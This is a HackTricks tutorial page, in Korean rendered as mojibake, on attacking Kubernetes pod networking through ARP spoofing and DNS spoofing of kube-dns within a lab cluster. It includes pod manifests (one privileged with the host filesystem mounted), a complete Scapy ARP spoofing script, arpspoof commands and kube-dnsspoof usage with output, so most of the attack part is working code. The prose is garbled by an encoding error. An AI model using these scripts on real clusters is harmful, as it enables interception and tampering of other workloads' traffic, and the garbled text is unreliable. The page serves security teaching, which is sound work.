# Kubernetes ë„¤íŠ¸ì›Œí¬ ê³µê²©

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* HackTricksì—ì„œ **íšŒì‚¬ ê´‘ê³ ë¥¼ ë³´ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ì„** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ì†Œê°œ

Kubernetesì—ì„œëŠ” **ë™ì¼í•œ ë…¸ë“œì— ìˆëŠ” ëª¨ë“  ì»¨í…Œì´ë„ˆ ê°„ì˜ ì—°ê²°ì„ í—ˆìš©í•˜ëŠ” ê¸°ë³¸ ë™ì‘**ì´ ê´€ì°°ë©ë‹ˆë‹¤. ì´ëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì˜ êµ¬ë¶„ ì—¬ë¶€ì™€ ê´€ê³„ì—†ì´ ì ìš©ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì—°ê²°ì€ **ë ˆì´ì–´ 2** (ì´ë”ë„·)ê¹Œì§€ í™•ì¥ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ëŸ¬í•œ êµ¬ì„±ì€ ì‹œìŠ¤í…œì„ ì·¨ì•½ì ì— ë…¸ì¶œì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ, ì´ëŠ” ì•…ì„± ì»¨í…Œì´ë„ˆê°€ ë™ì¼í•œ ë…¸ë“œì— ìˆëŠ” ë‹¤ë¥¸ ì»¨í…Œì´ë„ˆì— ëŒ€í•´ **ARP ìŠ¤í‘¸í•‘ ê³µê²©**ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì„ ì—½ë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²© ì¤‘ì— ì•…ì„± ì»¨í…Œì´ë„ˆëŠ” ë‹¤ë¥¸ ì»¨í…Œì´ë„ˆë¥¼ ìœ„í•´ ì˜ë„ëœ ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ì„ ì†ì„ìˆ˜ë¥¼ ë¶€ë¦¬ê±°ë‚˜ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ARP ìŠ¤í‘¸í•‘ ê³µê²©ì€ ë¡œì»¬ ì˜ì—­ ë„¤íŠ¸ì›Œí¬ì—ì„œ **ê³µê²©ìê°€ ìœ„ì¡°ëœ ARP** (ì£¼ì†Œ í•´ê²° í”„ë¡œí† ì½œ) ë©”ì‹œì§€ë¥¼ ë³´ë‚´ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ë¡œ ì¸í•´ ê³µê²©ìì˜ MAC ì£¼ì†Œê°€ ë„¤íŠ¸ì›Œí¬ ìƒì˜ ìœ íš¨í•œ ì»´í“¨í„° ë˜ëŠ” ì„œë²„ì˜ IP ì£¼ì†Œì™€ ì—°ê²°ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì´ ì„±ê³µì ìœ¼ë¡œ ì‹¤í–‰ë˜ë©´ ê³µê²©ìëŠ” ë°ì´í„°ë¥¼ ê°€ë¡œì±„ê±°ë‚˜ ìˆ˜ì •í•˜ê±°ë‚˜ ì¤‘ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³µê²©ì€ OSI ëª¨ë¸ì˜ ë ˆì´ì–´ 2ì—ì„œ ì‹¤í–‰ë˜ë¯€ë¡œ Kubernetesì˜ ì´ ë ˆì´ì–´ì—ì„œì˜ ê¸°ë³¸ ì—°ê²°ì€ ë³´ì•ˆ ë¬¸ì œë¥¼ ì•¼ê¸°ì‹œí‚µë‹ˆë‹¤.

ë‹¤ìŒ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì´ 4ëŒ€ì˜ ë¨¸ì‹ ì´ ìƒì„±ë©ë‹ˆë‹¤:

* ubuntu-pe: ë…¸ë“œë¡œ íƒˆì¶œí•˜ì—¬ ë©”íŠ¸ë¦­ì„ í™•ì¸í•˜ëŠ” ê¶Œí•œì´ ìˆëŠ” ë¨¸ì‹  (ê³µê²©ì— í•„ìš”í•˜ì§€ ì•ŠìŒ)
* **ubuntu-attack**: ê¸°ë³¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ìˆëŠ” **ì•…ì„±** ì»¨í…Œì´ë„ˆ
* **ubuntu-victim**: kube-system ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ìˆëŠ” **í”¼í•´ì** ë¨¸ì‹ 
* **mysql**: ê¸°ë³¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ìˆëŠ” **í”¼í•´ì** ë¨¸ì‹ 
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## ê¸°ë³¸ Kubernetes ë„¤íŠ¸ì›Œí‚¹

ì—¬ê¸°ì—ì„œ ì†Œê°œëœ ë„¤íŠ¸ì›Œí‚¹ ì£¼ì œì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì„ ì›í•œë‹¤ë©´, ì°¸ê³  ìë£Œë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.

### ARP

ì¼ë°˜ì ìœ¼ë¡œ, **ë…¸ë“œ ë‚´ì—ì„œ pod ê°„ì˜ ë„¤íŠ¸ì›Œí‚¹**ì€ ëª¨ë“  podë¥¼ ì—°ê²°í•˜ëŠ” **ë¸Œë¦¬ì§€**ë¥¼ í†µí•´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ ë¸Œë¦¬ì§€ëŠ” "**cbr0**"ë¼ê³  ë¶ˆë¦½ë‹ˆë‹¤. (ì¼ë¶€ ë„¤íŠ¸ì›Œí¬ í”ŒëŸ¬ê·¸ì¸ì€ ìì²´ ë¸Œë¦¬ì§€ë¥¼ ì„¤ì¹˜í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.) **cbr0ëŠ” ARP**(ì£¼ì†Œ í•´ê²° í”„ë¡œí† ì½œ) í•´ê²°ë„ ì²˜ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. cbr0ì— ë„ì°©í•œ íŒ¨í‚·ì€ ARPë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€ìƒ MAC ì£¼ì†Œë¥¼ í•´ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì‚¬ì‹¤ì€ ê¸°ë³¸ì ìœ¼ë¡œ **ê°™ì€ ë…¸ë“œì—ì„œ ì‹¤í–‰ë˜ëŠ” ëª¨ë“  pod**ê°€ ì´ë”ë„· ë ˆë²¨(layer 2)ì—ì„œ (ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì™€ëŠ” ë…ë¦½ì ìœ¼ë¡œ) ê°™ì€ ë…¸ë“œì˜ ë‹¤ë¥¸ podì™€ **í†µì‹ **í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

{% hint style="warning" %}
ë”°ë¼ì„œ, **ê°™ì€ ë…¸ë“œì˜ pod ê°„ì— ARP ìŠ¤í‘¸í•‘ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**
{% endhint %}

### DNS

Kubernetes í™˜ê²½ì—ì„œëŠ” ì¼ë°˜ì ìœ¼ë¡œ 1ê°œ (ë˜ëŠ” ê·¸ ì´ìƒ)ì˜ **DNS ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰**ë˜ëŠ” ê²ƒì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ kube-system ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
ì´ì „ ì •ë³´ì—ì„œ í¥ë¯¸ë¡œìš´ ì ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ì„œë¹„ìŠ¤ì˜ IP**ëŠ” **10.96.0.10**ì´ì§€ë§Œ, ì„œë¹„ìŠ¤ë¥¼ ì‹¤í–‰í•˜ëŠ” **íŒŒë“œì˜ IP**ëŠ” **172.17.0.2**ì…ë‹ˆë‹¤.

íŒŒë“œ ë‚´ë¶€ì—ì„œ DNS ì£¼ì†Œë¥¼ í™•ì¸í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë‚´ìš©ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
ê·¸ëŸ¬ë‚˜ **íŒŸ**ì€ **ì£¼ì†Œ**ì— ë„ë‹¬í•˜ëŠ” ë°©ë²•ì„ ì•Œì§€ ëª»í•©ë‹ˆë‹¤. ì´ ê²½ìš° **íŒŸ ë²”ìœ„**ëŠ” 172.17.0.10/26ì…ë‹ˆë‹¤.

ë”°ë¼ì„œ, íŒŸì€ **DNS ìš”ì²­ì„ ì£¼ì†Œ 10.96.0.10**ë¡œ ë³´ë‚´ê²Œ ë˜ê³ , ì´ëŠ” cbr0ì— ì˜í•´ **172.17.0.2ë¡œ ë³€í™˜**ë©ë‹ˆë‹¤.

{% hint style="warning" %}
ì´ëŠ” íŒŸì˜ **DNS ìš”ì²­**ì´ í•­ìƒ **ë¸Œë¦¬ì§€**ë¡œ ê°€ì„œ **ì„œë¹„ìŠ¤ IPë¥¼ ì—”ë“œí¬ì¸íŠ¸ IPë¡œ ë³€í™˜**ëœë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì‹¬ì§€ì–´ DNS ì„œë²„ê°€ íŒŸê³¼ ë™ì¼í•œ í•˜ìœ„ ë„¤íŠ¸ì›Œí¬ì— ìˆëŠ” ê²½ìš°ì—ë„ ë§ˆì°¬ê°€ì§€ì…ë‹ˆë‹¤.

ì´ë¥¼ ì•Œê³  ìˆìœ¼ë©°, **ARP ê³µê²©ì´ ê°€ëŠ¥**í•˜ë‹¤ëŠ” ê²ƒì„ ì•Œê³  ìˆë‹¤ë©´, ë…¸ë“œì˜ íŒŸì€ **ì„œë¸Œë„¤íŠ¸ì›Œí¬**ì˜ **ê° íŒŸ**ê³¼ **ë¸Œë¦¬ì§€** ì‚¬ì´ì˜ íŠ¸ë˜í”½ì„ ê°€ë¡œì±„ê³  **DNS ì‘ë‹µ**ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (**DNS ìŠ¤í‘¸í•‘**).

ê²Œë‹¤ê°€, **DNS ì„œë²„**ê°€ **ê³µê²©ìì™€ ë™ì¼í•œ ë…¸ë“œ**ì— ìˆëŠ” ê²½ìš°, ê³µê²©ìëŠ” í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  íŒŸì˜ DNS ìš”ì²­ì„ ê°€ë¡œì±„ê³  ì‘ë‹µì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (DNS ì„œë²„ì™€ ë¸Œë¦¬ì§€ ì‚¬ì´ì—ì„œ).
{% endhint %}

## ë™ì¼í•œ ë…¸ë“œì˜ íŒŸì—ì„œ ARP ìŠ¤í‘¸í•‘

ìš°ë¦¬ì˜ ëª©í‘œëŠ” **ubuntu-victimì—ì„œ mysqlë¡œì˜ í†µì‹ ì„ ì ì–´ë„ ë„ì²­í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof

ARPSpoofëŠ” ë„¤íŠ¸ì›Œí¬ ë‚´ì—ì„œ ARP í”„ë¡œí† ì½œì„ ì´ìš©í•˜ì—¬ ê³µê²©ìê°€ ì¤‘ê°„ì—ì„œ í†µì‹ ì„ ê°€ë¡œì±„ëŠ” ê³µê²© ê¸°ë²•ì…ë‹ˆë‹¤. ì´ ê³µê²©ì€ ê³µê²©ìê°€ ìì‹ ì„ ë¼ìš°í„°ë¡œ ì†ì´ê³ , ë¼ìš°í„°ê°€ ê³µê²©ìë¥¼ ì‹ ë¢°í•˜ì—¬ í†µì‹ ì„ ì¤‘ê°œí•˜ë„ë¡ ë§Œë“­ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” í†µì‹  ë‚´ìš©ì„ ê°ì²­í•˜ê±°ë‚˜ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ARPSpoof ê³µê²©ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” ê³µê²©ìëŠ” ë„¤íŠ¸ì›Œí¬ ë‚´ì—ì„œ ARP íŒ¨í‚·ì„ ì£¼ê¸°ì ìœ¼ë¡œ ì „ì†¡í•˜ì—¬ ë‹¤ë¥¸ ì¥ì¹˜ë“¤ì—ê²Œ ìì‹ ì˜ MAC ì£¼ì†Œë¥¼ ë¼ìš°í„°ì˜ MAC ì£¼ì†Œë¡œ ì†ì´ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ ê³µê²©ìëŠ” ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ì„ ê°€ë¡œì±„ê³  ì¡°ì‘í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

ARPSpoof ê³µê²©ì€ ì¤‘ê°„ì—ì„œ í†µì‹ ì„ ê°€ë¡œì±„ëŠ” Man-in-the-Middle(MITM) ê³µê²©ì˜ í•œ í˜•íƒœë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” í†µì‹  ë‚´ìš©ì„ ë„ì²­í•˜ê±°ë‚˜ ìˆ˜ì •í•˜ì—¬ ì¤‘ìš”í•œ ì •ë³´ë¥¼ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, ê³µê²©ìëŠ” í”¼í•´ìì™€ ë¼ìš°í„° ì‚¬ì´ì˜ í†µì‹ ì„ ì°¨ë‹¨í•˜ê±°ë‚˜ ì¡°ì‘í•˜ì—¬ ì„œë¹„ìŠ¤ ê±°ë¶€(DoS) ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ARPSpoof ê³µê²©ì€ ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ìˆ˜í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆì„ ê°•í™”í•˜ê³ , ARP í”„ë¡œí† ì½œì„ ì•ˆì „í•˜ê²Œ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ì ì ˆí•œ ëŒ€ì‘ì±…ì„ ë§ˆë ¨í•´ì•¼ í•©ë‹ˆë‹¤.
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS ìŠ¤í‘¸í•‘

ì´ë¯¸ ì–¸ê¸‰í•œ ëŒ€ë¡œ, DNS ì„œë²„ podì˜ ë™ì¼í•œ ë…¸ë“œì— ìˆëŠ” podë¥¼ ì¹¨í•´í•˜ë©´, ë¸Œë¦¬ì§€ì™€ DNS podë¥¼ ARPSpoofingìœ¼ë¡œ MitMí•  ìˆ˜ ìˆìœ¼ë©° ëª¨ë“  DNS ì‘ë‹µì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë¥¼ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•œ ì•„ì£¼ ì¢‹ì€ ë„êµ¬ì™€ íŠœí† ë¦¬ì–¼ì´ ìˆìŠµë‹ˆë‹¤. [https://github.com/danielsagi/kube-dnsspoof/](https://github.com/danielsagi/kube-dnsspoof/)

ìš°ë¦¬ì˜ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ê³µê²©ì podì—ì„œ ë„êµ¬ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³ , `hosts`ë¼ëŠ” ì´ë¦„ì˜ íŒŒì¼ì„ ìƒì„±í•˜ì—¬ ìŠ¤í‘¸í•‘í•˜ë ¤ëŠ” ë„ë©”ì¸ì„ ì§€ì •í•˜ì‹­ì‹œì˜¤:
```
cat hosts
google.com. 1.1.1.1
```
ubuntu-victim ë¨¸ì‹ ì— ëŒ€í•œ ê³µê²©ì„ ìˆ˜í–‰í•˜ì‹­ì‹œì˜¤:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
ë‹¹ì‹ ì´ ìì²´ DNS ìŠ¤í‘¸í•‘ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë§Œë“¤ë ¤ê³  í•œë‹¤ë©´, **DNS ì‘ë‹µì„ ìˆ˜ì •**ë§Œ í•œë‹¤ê³  í•´ì„œ **ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì™œëƒí•˜ë©´ **ì‘ë‹µ**ì€ ì•…ì„± **íŒŸ**ì˜ IP ì£¼ì†Œì¸ **src IP**ë¥¼ ê°€ì§€ê³  ìˆê¸° ë•Œë¬¸ì— **ìˆ˜ë½ë˜ì§€ ì•Šì„ ê²ƒ**ì…ë‹ˆë‹¤. í”¼í•´ìê°€ DNS ìš”ì²­ì„ ë³´ë‚´ëŠ” DNSì˜ **src IP** (ì˜ˆ: 172.16.0.2)ë¡œ **ìƒˆë¡œìš´ DNS íŒ¨í‚·**ì„ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤. (10.96.0.10ì€ K8s DNS ì„œë¹„ìŠ¤ IPì´ë©° DNS ì„œë²„ IPê°€ ì•„ë‹™ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ ì†Œê°œì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
{% endhint %}

## íŠ¸ë˜í”½ ìº¡ì²˜

[Mizu](https://github.com/up9inc/mizu) ë„êµ¬ëŠ” Kubernetesìš© ê°„ë‹¨í•˜ë©´ì„œë„ ê°•ë ¥í•œ API íŠ¸ë˜í”½ ë·°ì–´ë¡œ, ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ê°„ì˜ ëª¨ë“  API í†µì‹ ì„ ë³¼ ìˆ˜ ìˆì–´ ë””ë²„ê·¸ ë° ì¬ê·€ì ì¸ ë¬¸ì œ í•´ê²°ì— ë„ì›€ì´ ë©ë‹ˆë‹¤.\
ì„ íƒí•œ íŒŸì— ì—ì´ì „íŠ¸ë¥¼ ì„¤ì¹˜í•˜ê³  ê·¸ë“¤ì˜ íŠ¸ë˜í”½ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ì—¬ ì›¹ ì„œë²„ì—ì„œ ë³´ì—¬ì¤ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ë¥¼ ìœ„í•´ì„œëŠ” ë†’ì€ K8s ê¶Œí•œì´ í•„ìš”í•˜ë©°, ê·¸ë¦¬ ì€ë°€í•˜ì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤.

## ì°¸ê³  ìë£Œ

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ì„** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **ë‹¹ì‹ ì˜ í•´í‚¹ ê¸°ìˆ ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
